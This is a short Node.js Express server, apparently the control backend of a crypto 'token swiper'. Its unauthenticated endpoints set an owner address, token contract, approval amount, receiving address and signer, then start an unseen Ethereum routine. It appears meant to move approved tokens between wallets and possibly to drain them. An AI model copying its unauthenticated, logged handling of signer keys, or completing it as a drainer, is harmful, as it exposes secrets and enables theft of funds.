const express = require("express")
const main = require("./ethereum/main")
const cors = require("cors")
const db = require("./config/db")

const app = express()

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({extended: false}))

app.get("/", (req, res)=>{
  res.send("welcome to token swiper")
})

app.get("/details", async(req, res)=>{
  try{
     let result = await db.getMany(["owner-address", "token-ca","approve-amount", "receiving-address"])
     res.status(200).json({data: result, message: "details fetched"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
})

app.post("/token-ca", async(req, res)=>{
  try{
    let {token_ca} = req.body
    console.log(token_ca);
    await db.put("token-ca", token_ca)
    res.status(200).json({message: "token_ca added"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
})

app.post("/owner-address", async (req, res)=>{
  try{
    let {owner_address} = req.body
    console.log(owner_address)
    await db.put("owner-address", owner_address)
    res.status(200).json({message: "owner_address added"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
})

app.post("/receiving-address", async (req, res)=>{
  try{
    let {receiving_address} = req.body;
    console.log(req.body)
    await db.put("receiving-address", receiving_address)
    res.status(200).json({message: "receiving_address added"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
  
})

app.post("/approve-amount", async (req, res)=>{
  try{
    let {approve_amount} = req.body
    console.log(approve_amount)
    await db.put("approve-amount", approve_amount)
    res.status(200).json({message: "approve-amount set"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
})

app.post("/owner-signer", async (req, res)=>{
  try{
    let {signer} = req.body
    await db.put("signer", signer)
    res.status(200).json({message: "signer set"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
})


app.listen(3000, ()=>{
  console.log("app listening on port 3000")
  main()
})